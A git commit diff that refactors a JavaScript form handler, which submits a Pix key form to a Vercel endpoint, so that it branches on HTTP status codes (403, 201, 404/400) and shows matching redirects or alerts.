583117d15e8a9cfbc57a9684f683c4c35be40eb2
Daanrox <daanielrox@hotmail.com>
2023-12-14 21:33:05 -0300

    Update c082jk4bs153n1ijs90225x002is9hw2q.js

--- assets/js/c082jk4bs153n1ijs90225x002is9hw2q.js
+++ assets/js/c082jk4bs153n1ijs90225x002is9hw2q.js
@@ -15,25 +15,40 @@ document.getElementById('formPix').addEventListener('submit', function(event) {
     };
 
 
-   fetch('https://pix-6v3z2gpui-daanrox.vercel.app/create', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data)
-    })
-    .then(response => response.json())
-    .then(result => {
-        console.log(result)
-        if(result.message === "Chave pix já resgatada"){
-            window.location.href='api2.html';
-        } else if(result.response === "OK"){
-            window.location.href='sucessod41d.html'
-        }{
-            console.log(result); 
-        }
-    })
-    .catch(error => {
-        console.error('Erro:', error);
-    });
+fetch('https://pix-6v3z2gpui-daanrox.vercel.app/create', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(data)
+})
+.then(response => {
+    if (response.status === 403) {
+        return response.json().then(result => {
+            if (result.message === "Chave pix já resgatada") {
+                window.location.href = 'api2.html';
+            } 
+            console.log(result)
+        });
+    } else if (response.status === 201) {
+        return response.json().then(result => {
+            if (result.response === "OK") {
+                window.location.href = 'sucessod41d.html';
+            } 
+            console.log(result)
+        });
+    } else if (response.status === 404 || response.status === 400) {
+        return response.json().then(result => {
+            if (result.response === "PIX_KEY_NOT_FOUND") {
+               alert("Chave Pix Não Encontrada!")
+            }
+            console.log(result)
+        });
+    } else {
+        console.log('Status desconhecido:', response.status);
+    }
+})
+.catch(error => {
+    console.error('Erro:', error);
+});
 });
